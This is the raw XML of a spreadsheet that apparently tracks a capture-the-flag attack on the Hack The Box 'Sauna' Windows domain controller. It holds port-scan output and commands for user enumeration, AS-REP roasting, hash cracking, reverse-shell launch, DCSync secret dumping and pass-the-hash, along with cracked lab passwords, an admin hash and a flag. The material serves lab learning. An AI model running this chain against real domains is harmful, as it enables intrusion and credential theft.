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A2545FF7-B20A-4FF7-A506-EF644D1667F9}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-135" yWindow="-16335" windowWidth="29070" windowHeight="15750" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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3" i="1" l="1"/>
  <c r="F8" i="1"/>
  <c r="F13" i="1"/>
  <c r="F14" i="1"/>
  <c r="F15" i="1"/>
  <c r="F16" i="1"/>
  <c r="F17" i="1"/>
  <c r="F18" i="1"/>
  <c r="F19" i="1"/>
  <c r="E14" i="1"/>
  <c r="E15" i="1"/>
  <c r="E16" i="1"/>
  <c r="E17" i="1"/>
  <c r="E18" i="1"/>
  <c r="E19" i="1"/>
  <c r="E2" i="1"/>
  <c r="F2" i="1"/>
  <c r="E3" i="1"/>
  <c r="F3" i="1"/>
  <c r="E4" i="1"/>
  <c r="F4" i="1"/>
  <c r="E5" i="1"/>
  <c r="F5" i="1"/>
  <c r="E6" i="1"/>
  <c r="F6" i="1"/>
  <c r="E7" i="1"/>
  <c r="F7" i="1"/>
  <c r="E8" i="1"/>
  <c r="E9" i="1"/>
  <c r="F9" i="1"/>
  <c r="E10" i="1"/>
  <c r="F10" i="1"/>
  <c r="E11" i="1"/>
  <c r="F11" i="1"/>
  <c r="E12" i="1"/>
  <c r="F12" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="180" uniqueCount="112">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>53/tcp</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>88/tcp</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>389/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>464/tcp</t>
  </si>
  <si>
    <t>593/tcp</t>
  </si>
  <si>
    <t>636/tcp</t>
  </si>
  <si>
    <t>3268/tcp</t>
  </si>
  <si>
    <t>3269/tcp</t>
  </si>
  <si>
    <t>5985/tcp</t>
  </si>
  <si>
    <t>9389/tcp</t>
  </si>
  <si>
    <t>49668/tcp</t>
  </si>
  <si>
    <t>49673/tcp</t>
  </si>
  <si>
    <t>49677/tcp</t>
  </si>
  <si>
    <t>49698/tcp</t>
  </si>
  <si>
    <t>53/tcp    open  domain        Simple DNS Plus</t>
  </si>
  <si>
    <t>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-01 04:58:07Z)</t>
  </si>
  <si>
    <t>135/tcp   open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>445/tcp   open  microsoft-ds?</t>
  </si>
  <si>
    <t>464/tcp   open  kpasswd5?</t>
  </si>
  <si>
    <t>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>636/tcp   open  tcpwrapped</t>
  </si>
  <si>
    <t>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>3269/tcp  open  tcpwrapped</t>
  </si>
  <si>
    <t>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>9389/tcp  open  mc-nmf        .NET Message Framing</t>
  </si>
  <si>
    <t>49668/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>49677/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49698/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>No anon login.</t>
  </si>
  <si>
    <t>SAUNA.EGOTISTICAL-BANK.LOCAL</t>
  </si>
  <si>
    <t>Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</t>
  </si>
  <si>
    <t>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.SAUNA.EGOTISTICAL-BANK.LOCAL" -u http://SAUNA.EGOTISTICAL-BANK.LOCAL -fw 15329</t>
  </si>
  <si>
    <t>dirsearch literally returned nothing. Fantastic.
Neither is subdomains. Nor enum4linux.</t>
  </si>
  <si>
    <t>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.EGOTISTICAL-BANK.LOCAL" -u http://EGOTISTICAL-BANK.LOCAL -fw 15329</t>
  </si>
  <si>
    <t>http://sauna.egotistical-bank.local</t>
  </si>
  <si>
    <t>/index.html</t>
  </si>
  <si>
    <t>/single.html</t>
  </si>
  <si>
    <t>/contact.html</t>
  </si>
  <si>
    <t>/about.html</t>
  </si>
  <si>
    <t>/blog.html</t>
  </si>
  <si>
    <t>Contact page.</t>
  </si>
  <si>
    <t>405 - HTTP verb used to access this page is not allowed.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>methods: TRACE</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://sauna.egotistical-bank.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  </t>
  </si>
  <si>
    <t>python3 dirsearch.py -u http://sauna.egotistical-bank.local -e .zip,.bak,.txt</t>
  </si>
  <si>
    <t>Microsoft-IIS/10.0
Jenny Joy</t>
  </si>
  <si>
    <t>uname -m</t>
  </si>
  <si>
    <t>./username-anarchy -i ~/htb/sauna/users.txt &gt; ~/htb/sauna/new_users.txt</t>
  </si>
  <si>
    <t xml:space="preserve">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt </t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Had to make my own list with username anarchy.</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
fsmith has preauth disabled and I have the hash.
Cracked hash.</t>
    </r>
  </si>
  <si>
    <t>fsmith</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">fsmith[@]EGOTISTICAL-BANK.LOCAL
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>fsmith:Thestrokes23</t>
    </r>
  </si>
  <si>
    <t>https://linuxize.com/post/how-to-use-sed-to-find-and-replace-string-in-files/</t>
  </si>
  <si>
    <t>ln -s ~/htb/tools/ toollink</t>
  </si>
  <si>
    <t>$userPassword = ConvertTo-SecureString -String "Moneymakestheworldgoround!" -AsPlainText -Force</t>
  </si>
  <si>
    <t>$userCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "svc_loanmanager", $userPassword</t>
  </si>
  <si>
    <t>Remove-Item powershell-reverse-shell.ps1</t>
  </si>
  <si>
    <t xml:space="preserve">upload powershell-reverse-shell.ps1 </t>
  </si>
  <si>
    <t>Start-Process "powershell.exe" -Credential $userCredential -UseNewEnvironment -Argumentlist "-File C:\Users\FSmith\Downloads\powershell-reverse-shell.ps1"</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Administrator:500:aad3b435b51404eeaad3b435b51404ee:</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>823452073d75b9d1cf70ebdf86c7f98e</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">:::
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>root.txt: 2e4d1617b8d4488a0d256884f4d9a945</t>
    </r>
  </si>
  <si>
    <t>Found AutoLogon credentials.
Goot root. It was a dcsync attack. Weirdly enough the usernames were not matching.
Yeah it was svc_loanmgr not svc_loanmanager.</t>
  </si>
  <si>
    <t>unlink toollink</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">evil-winrm -i [victim IP] -u fsmith -p Thestrokes23  </t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP]  -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t>nxc ldap [victim IP] -u '' -p '' --users</t>
  </si>
  <si>
    <t>nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://[victim IP] -w ~/htb/sauna/wp-fuzz.txt </t>
  </si>
  <si>
    <t>nmap -n -sV --script "ldap* and not brute" [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">./kerbrute_linux_amd64 userenum ~/htb/sauna/users.txt --dc [victim IP] --domain EGOTISTICAL-BANK.LOCAL  </t>
  </si>
  <si>
    <t xml:space="preserve"> GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile "new_users.txt" -dc-ip [victim IP] -request -format john</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'</t>
  </si>
  <si>
    <t>secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@[victim IP]'</t>
  </si>
  <si>
    <t xml:space="preserve">bloodhound-ce-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns [victim IP] -c All --zip  </t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e</t>
  </si>
  <si>
    <t>psexec.py egotistical-bank.local/administrator@[victim IP] -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e</t>
  </si>
  <si>
    <t xml:space="preserve">sudo sed -i 's/[old IP]/[victim IP]/g' /etc/hosts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</si>
</sst>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2" fontId="5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linuxize.com/post/how-to-use-sed-to-find-and-replace-string-in-fi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755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K28"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="I27" sqref="I27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="6" width="15.77734375" style="2"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="23.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="15.77734375" style="2"/>
    <col min="11" max="11" width="34.5546875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18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21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>24</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E19" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>53</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F19" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D3" s="4" t="s">
        <v>25</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>80</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>73</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>63</v>
      </c>
      <c r="I3" s="2" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D4" s="4" t="s">
        <v>26</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>88</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>43</v>
      </c>
      <c r="H4" s="2" t="s">
        <v>80</v>
      </c>
      <c r="I4" s="2" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>27</v>
      </c>
      <c r="E5" s="7" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>44</v>
      </c>
      <c r="H5" s="4"/>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>139</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E7" s="7" t="str">
        <f t="shared" si="0"/>
        <v>389</v>
      </c>
      <c r="F7" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E8" s="7" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F8" s="6" t="str">
        <f>MID($D8,FIND("/",$D8)+1,LEN($D8))</f>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>47</v>
      </c>
      <c r="H8" s="2" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E9" s="7" t="str">
        <f t="shared" si="0"/>
        <v>464</v>
      </c>
      <c r="F9" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>48</v>
      </c>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E10" s="7" t="str">
        <f t="shared" si="0"/>
        <v>593</v>
      </c>
      <c r="F10" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>49</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E11" s="7" t="str">
        <f t="shared" si="0"/>
        <v>636</v>
      </c>
      <c r="F11" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="2" t="s">
        <v>50</v>
      </c>
      <c r="H11" s="4"/>
      <c r="I11" s="4"/>
      <c r="J11" s="5"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E12" s="8" t="str">
        <f t="shared" si="0"/>
        <v>3268</v>
      </c>
      <c r="F12" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="2" t="s">
        <v>51</v>
      </c>
      <c r="I12" s="4"/>
      <c r="J12" s="5"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E13" s="8" t="str">
        <f>LEFT($D13,FIND("/",$D13)-1)</f>
        <v>3269</v>
      </c>
      <c r="F13" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="2" t="s">
        <v>52</v>
      </c>
      <c r="I13" s="4"/>
      <c r="J13" s="5"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E14" s="8" t="str">
        <f t="shared" si="0"/>
        <v>5985</v>
      </c>
      <c r="F14" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>53</v>
      </c>
      <c r="H14" s="4" t="s">
        <v>94</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E15" s="7" t="str">
        <f t="shared" si="0"/>
        <v>9389</v>
      </c>
      <c r="F15" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>54</v>
      </c>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B16" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C16" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E16" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49668</v>
      </c>
      <c r="F16" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G16" s="2" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="17" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B17" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C17" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E17" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49673</v>
      </c>
      <c r="F17" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="18" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B18" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C18" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D18" s="2" t="s">
        <v>40</v>
      </c>
      <c r="E18" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49677</v>
      </c>
      <c r="F18" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G18" s="2" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="19" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="2" t="s">
        <v>93</v>
      </c>
      <c r="B19" s="2" t="s">
        <v>61</v>
      </c>
      <c r="C19" s="2" t="s">
        <v>60</v>
      </c>
      <c r="D19" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E19" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49698</v>
      </c>
      <c r="F19" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G19" s="2" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="20" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E20" s="7"/>
      <c r="F20" s="6"/>
    </row>
    <row r="21" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E21" s="7"/>
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E22" s="7"/>
      <c r="F22" s="6"/>
    </row>
    <row r="23" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E23" s="7"/>
      <c r="F23" s="6"/>
      <c r="I23" s="4"/>
      <c r="J23" s="5"/>
    </row>
    <row r="24" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="7"/>
      <c r="F24" s="6"/>
    </row>
    <row r="25" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E25" s="7"/>
      <c r="F25" s="6"/>
    </row>
    <row r="26" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E26" s="7"/>
      <c r="F26" s="6"/>
      <c r="I26" s="4"/>
      <c r="J26" s="5"/>
    </row>
    <row r="27" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E27" s="7"/>
      <c r="F27" s="6"/>
    </row>
    <row r="28" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E28" s="7"/>
      <c r="F28" s="6"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K30">
    <sortCondition ref="F2:F30"/>
    <sortCondition ref="E2:E30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B5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:H24"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" sqref="A1:XFD1048576"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="38.44140625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="D1" s="4" t="s">
